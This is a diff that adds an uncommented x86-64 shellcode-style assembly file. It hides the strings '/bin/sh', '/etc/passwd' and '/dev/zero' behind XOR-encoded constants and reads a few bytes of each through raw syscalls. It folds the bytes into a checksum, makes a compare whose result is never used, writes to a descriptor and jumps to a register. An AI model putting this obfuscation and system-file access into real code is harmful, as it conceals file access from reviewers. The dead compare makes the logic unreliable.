@@ -1,0 +1,114 @@
+push   rsp
+pop    rbp
+xor    esi,esi
+movabs rcx,0x379f3a62b80657a1
+
+movabs rdx,0x37f7494dd66f358e
+
+xor    rcx,rdx
+push   rcx
+push   rsp
+pop    rdi
+push   0x2
+pop    rax
+cdq
+syscall
+xchg   rdi,rax
+xor    eax,eax
+push   rax
+push   rsp
+pop    rsi
+push   0x4
+pop    rdx
+syscall
+pop    r12
+push   0x3
+pop    rax
+syscall
+xor    esi,esi
+movabs rcx,0xaac06463c36f3b3b
+
+movabs rdx,0xaac06463c30b4c48
+
+xor    rcx,rdx
+push   rcx
+movabs rcx,0x7da9f8d67582578c
+
+movabs rdx,0xec888f916f632a3
+
+xor    rcx,rdx
+push   rcx
+push   rsp
+pop    rdi
+push   0x2
+pop    rax
+cdq
+syscall
+xchg   rdi,rax
+xor    eax,eax
+push   rax
+push   rsp
+pop    rsi
+push   0x4
+pop    rdx
+syscall
+pop    r13
+push   0x3
+pop    rax
+syscall
+xor    esi,esi
+push   0x6f
+movabs rcx,0x77d9f62d0c06e559
+
+movabs rdx,0x5bc8c027a638176
+
+xor    rcx,rdx
+push   rcx
+push   rsp
+pop    rdi
+push   0x2
+pop    rax
+cdq
+syscall
+xchg   rdi,rax
+xor    eax,eax
+push   rax
+push   rsp
+pop    rsi
+push   0x4
+pop    rdx
+syscall
+pop    rax
+not    rax
+shr    rax,0x1d
+cqo
+push   0x29
+pop    rcx
+div    rcx
+xchg   r14,rax
+push   0x3
+pop    rax
+syscall
+mov    eax,0xeb90e12
+add    eax,r12d
+xor    eax,r13d
+ror    eax,0xb
+not    eax
+xor    eax,r14d
+cmp    eax,0x526851a7
+push   0x1
+pop    rax
+xor    rax,rax
+push   rax
+push   rbx
+pop    rdi
+push   rsp
+pop    rsi
+push   0x8
+pop    rdx
+push   0x1
+pop    rax
+syscall
+push   rbp
+pop    rsp
+jmp    r15 
